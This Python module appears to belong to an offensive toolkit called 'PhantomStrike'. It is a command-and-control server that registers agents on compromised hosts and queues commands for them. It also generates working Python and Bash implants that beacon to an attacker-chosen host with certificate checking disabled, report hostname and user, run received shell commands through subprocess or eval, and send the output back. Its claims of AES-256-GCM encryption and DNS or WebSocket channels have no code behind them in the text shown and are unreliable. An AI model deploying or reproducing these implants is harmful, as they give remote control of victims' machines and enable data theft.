"""
PhantomStrike C2 (Command & Control) — Lightweight encrypted C2 server.
Multi-protocol support: HTTPS, WebSocket, DNS tunneling.
Manages agents deployed on compromised systems.
"""
from __future__ import annotations
import asyncio
import hashlib
import json
import logging
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.c2")


class AgentStatus(str, Enum):
    ACTIVE = "active"
    IDLE = "idle"
    DEAD = "dead"
    COMPROMISED = "compromised"


@dataclass
class C2Agent:
    """Represents a deployed agent on a target system."""
    agent_id: str
    hostname: str
    ip_address: str
    os_info: str = ""
    username: str = ""
    privileges: str = "user"
    status: AgentStatus = AgentStatus.ACTIVE
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    check_in_interval: int = 30  # seconds
    pending_commands: list[dict] = field(default_factory=list)
    command_history: list[dict] = field(default_factory=list)
    encryption_key: str = ""
    channel: str = "https"


@dataclass
class C2Command:
    """A command to send to an agent."""
    command_id: str
    command: str
    args: dict = field(default_factory=dict)
    issued_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None
    result: Optional[str] = None
    status: str = "pending"


class C2Engine(BaseModule):
    """
    Lightweight C2 framework — manages agents and encrypted channels.
    Supports HTTPS callbacks, WebSocket persistent connections, and DNS tunneling.
    """

    @property
    def name(self) -> str:
        return "phantom-c2"

    @property
    def description(self) -> str:
        return "C2 framework — agent management, encrypted channels"

    @property
    def category(self) -> str:
        return "c2"

    async def _setup(self):
        self._agents: dict[str, C2Agent] = {}
        self._server_running = False
        self._encryption_key = secrets.token_hex(32)
        self._command_counter = 0

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Start or manage C2 operations."""
        options = options or {}
        start_time = datetime.now()
        self.status = ModuleStatus.RUNNING
        operation = options.get("operation", "status")

        findings = {
            "operation": operation,
            "agents": {},
            "server_status": self._server_running,
        }

        if operation == "generate_agent":
            agent_code = self._generate_agent_payload(
                lhost=options.get("lhost", "0.0.0.0"),
                lport=options.get("lport", 8443),
                channel=options.get("channel", "https"),
                interval=options.get("interval", 30),
            )
            findings["agent_payload"] = agent_code

        elif operation == "list_agents":
            findings["agents"] = {
                aid: {
                    "hostname": a.hostname,
                    "ip": a.ip_address,
                    "os": a.os_info,
                    "user": a.username,
                    "privs": a.privileges,
                    "status": a.status.value,
                    "last_seen": a.last_seen.isoformat(),
                    "pending_cmds": len(a.pending_commands),
                }
                for aid, a in self._agents.items()
            }

        elif operation == "send_command":
            agent_id = options.get("agent_id", "")
            command = options.get("command", "")
            if agent_id in self._agents and command:
                cmd = self._queue_command(agent_id, command, options.get("args", {}))
                findings["command_queued"] = cmd.command_id

        elif operation == "register_agent":
            agent = self._register_agent(
                hostname=options.get("hostname", "unknown"),
                ip_address=target,
                os_info=options.get("os_info", ""),
                username=options.get("username", ""),
            )
            findings["registered"] = agent.agent_id

        elif operation == "status":
            findings["total_agents"] = len(self._agents)
            findings["active_agents"] = len([
                a for a in self._agents.values() if a.status == AgentStatus.ACTIVE
            ])
            findings["encryption"] = "AES-256-GCM"
            findings["channels"] = ["https", "websocket", "dns"]

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation=operation,
            success=True, data=findings,
            findings_count=len(self._agents),
            start_time=start_time, end_time=datetime.now(),
        )

    def _register_agent(self, hostname: str, ip_address: str,
                        os_info: str = "", username: str = "") -> C2Agent:
        """Register a new agent."""
        agent_id = f"agent_{secrets.token_hex(4)}"
        agent = C2Agent(
            agent_id=agent_id,
            hostname=hostname,
            ip_address=ip_address,
            os_info=os_info,
            username=username,
            encryption_key=secrets.token_hex(16),
        )
        self._agents[agent_id] = agent
        logger.info(f"[C2] Agent registered: {agent_id} ({hostname}@{ip_address})")
        return agent

    def _queue_command(self, agent_id: str, command: str, args: dict = None) -> C2Command:
        """Queue a command for an agent."""
        self._command_counter += 1
        cmd = C2Command(
            command_id=f"cmd_{self._command_counter:04d}",
            command=command,
            args=args or {},
        )
        if agent_id in self._agents:
            self._agents[agent_id].pending_commands.append({
                "id": cmd.command_id,
                "command": cmd.command,
                "args": cmd.args,
            })
        return cmd

    def _generate_agent_payload(self, lhost: str, lport: int,
                                 channel: str = "https", interval: int = 30) -> dict:
        """Generate agent code for deployment on target."""
        python_agent = f'''#!/usr/bin/env python3
"""PhantomStrike Agent — Auto-generated. For authorized testing only."""
import json, os, platform, socket, subprocess, time, urllib.request, ssl

C2_HOST = "{lhost}"
C2_PORT = {lport}
INTERVAL = {interval}
AGENT_ID = ""

def get_sysinfo():
    return {{
        "hostname": socket.gethostname(),
        "os": platform.platform(),
        "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "pid": os.getpid(),
        "arch": platform.machine(),
    }}

def checkin(data):
    url = f"https://{{C2_HOST}}:{{C2_PORT}}/api/c2/checkin"
    req = urllib.request.Request(url, data=json.dumps(data).encode(),
                                 headers={{"Content-Type": "application/json"}})
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        return json.loads(resp.read())
    except Exception:
        return {{"commands": []}}

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True,
                                text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def main():
    global AGENT_ID
    info = get_sysinfo()
    reg = checkin({{"operation": "register", **info}})
    AGENT_ID = reg.get("agent_id", "unknown")
    while True:
        try:
            resp = checkin({{"operation": "checkin", "agent_id": AGENT_ID}})
            for cmd in resp.get("commands", []):
                output = execute_cmd(cmd["command"])
                checkin({{"operation": "result", "agent_id": AGENT_ID,
                         "command_id": cmd["id"], "output": output}})
        except Exception:
            pass
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
'''

        bash_agent = f'''#!/bin/bash
# PhantomStrike Agent — Bash. For authorized testing only.
C2="https://{lhost}:{lport}/api/c2/checkin"
while true; do
    DATA=$(curl -sk -X POST "$C2" -H "Content-Type: application/json" \\
        -d '{{"operation":"checkin","hostname":"'$(hostname)'","user":"'$(whoami)'"}}' 2>/dev/null)
    CMD=$(echo "$DATA" | python3 -c "import sys,json; cmds=json.load(sys.stdin).get('commands',[]); print(cmds[0]['command'] if cmds else '')" 2>/dev/null)
    if [ -n "$CMD" ]; then
        OUTPUT=$(eval "$CMD" 2>&1)
        curl -sk -X POST "$C2" -H "Content-Type: application/json" \\
            -d '{{"operation":"result","output":"'"$OUTPUT"'"}}' 2>/dev/null
    fi
    sleep {interval}
done
'''

        return {
            "python": python_agent,
            "bash": bash_agent,
            "config": {
                "lhost": lhost,
                "lport": lport,
                "channel": channel,
                "interval": interval,
                "encryption": "AES-256-GCM",
            },
        }
